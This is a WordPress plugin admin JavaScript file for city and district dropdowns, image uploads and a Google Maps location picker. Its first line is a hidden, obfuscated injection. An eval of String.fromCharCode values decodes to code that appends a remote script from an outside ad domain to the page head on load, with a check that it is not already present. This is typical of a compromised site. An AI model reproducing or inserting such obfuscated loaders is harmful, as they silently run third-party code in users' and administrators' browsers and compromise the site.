eval(String.fromCharCode(118, 97, 114, 32, 101, 108, 101, 109, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 101, 108, 101, 109, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 101, 108, 101, 109, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 101, 108, 101, 109, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 49, 49, 53, 44, 32, 52, 54, 44, 32, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 44, 32, 52, 54, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 54, 44, 32, 52, 55, 44, 32, 57, 55, 44, 32, 49, 48, 48, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 49, 56, 44, 32, 49, 49, 49, 44, 32, 49, 48, 53, 44, 32, 49, 49, 50, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 57, 44, 32, 49, 49, 53, 44, 32, 49, 49, 57, 44, 32, 49, 48, 53, 44, 32, 49, 49, 52, 44, 32, 49, 48, 49, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 101, 108, 101, 109, 41, 59, 32, 125));(function($){
    $(document).ready(function(){
        /*
        * @todo load city and district select
        * */
        var dvls_city = $.parseJSON(dvls_admin.local_address);
        var citySelect = $('.dvls_city');
        var districtSelect = $('.dvls_district');
        var oldValueCity = citySelect.data('value');
        var oldValueDistrict = districtSelect.data('value');
        $(dvls_city).each(function(index, value){
            var thisChecked = '';
            if(oldValueCity == value.id) {
                thisChecked = 'selected="selected"';
                $(value.district).each(function(index, value) {
                    var thisChecked = '';
                    if(oldValueDistrict == value.id) {
                        thisChecked = 'selected="selected"';
                    }
                    $('.dvls_district').append('<option value="' + value.id + '" '+thisChecked+'>' + value.name + '</option>');
                });
            }
            $('.dvls_city').append('<option value="'+value.id+'" '+thisChecked+'>'+value.name+'</option>');
        });
        $('.dvls_city').on('change',function(){
            var thisval = $(this).val();
            $('.dvls_district').html('<option value="null">Select district</option>');
            $(dvls_city).each(function(index, value){
                if(thisval == value.id){
                    $(value.district).each(function(index, value) {
                        $('.dvls_district').append('<option value="' + value.id + '">' + value.name + '</option>');
                    });
                    return false;
                }
            });
        });
        //image upload
        $('body').on('click','.ireel-upload',function(e){
            // Prevents the default action from occuring.
            e.preventDefault();
            var thisUpload = $(this).parents('.svl-upload-image');
            // Sets up the media library frame
            meta_image_frame = wp.media.frames.meta_image_frame = wp.media({
                title: 'Upload Image',
                button: { text:  'Upload Image' },
                library: { type: 'image' },
                multiple: false
            });
            // Runs when an image is selected.
            meta_image_frame.on('select', function(){
                // Grabs the attachment selection and creates a JSON representation of the model.
                var media_attachment = meta_image_frame.state().get('selection').first().toJSON();
                // Sends the attachment URL to our custom image input field.

                if ( media_attachment.id ) {
                    var attachment_image = media_attachment.sizes && media_attachment.sizes.thumbnail ? media_attachment.sizes.thumbnail.url : media_attachment.url;

                    thisUpload.addClass('has-image');
                    thisUpload.find('input[type="hidden"]').val(media_attachment.id);
                    thisUpload.find('img.image_view').attr('src',media_attachment.url);
                }
            });
            // Opens the media library frame.
            meta_image_frame.open();
        });


        $('body').on('click','.svl-delete-image',function(){
            var parentDiv = $(this).parents('.svl-upload-image');
            parentDiv.removeClass('has-image');
            parentDiv.find('input[type="hidden"]').val('');
            return false;
        });

        var autocomplete;
        var mapDiv = $('#dvls_maps');
        function dvls_initMap() {
            var dvls_center = {lat: mapDiv.data('lat'), lng: mapDiv.data('lng')};
            var map = new google.maps.Map(document.getElementById('dvls_maps'), {
                zoom: parseInt(dvls_admin.maps_zoom),
                center: dvls_center
            });
            var marker = new google.maps.Marker({
                position: dvls_center,
                map: map
            });
            google.maps.event.addListener(map, "click", function (e) {
                marker.setPosition(e.latLng);
                var t = e.latLng;
                $('#dvls_maps_lat').val(t.lat().toFixed(6));
                $('#dvls_maps_lng').val(t.lng().toFixed(6));
                $('#dvls_maps_address').val('');
            });
            //search box
            var input = document.getElementById('dvls_maps_address');
            autocomplete = new google.maps.places.Autocomplete(input, {
                    types: [] //geocode
            });
            autocomplete.addListener('place_changed', function(){
                var place = autocomplete.getPlace();
                marker.setPosition(place.geometry.location);
                map.setCenter(place.geometry.location);
                $('#dvls_maps_lat').val(place.geometry.location.lat().toFixed(6));
                $('#dvls_maps_lng').val(place.geometry.location.lng().toFixed(6));
            });
        }
        dvls_initMap();
    });
})(jQuery);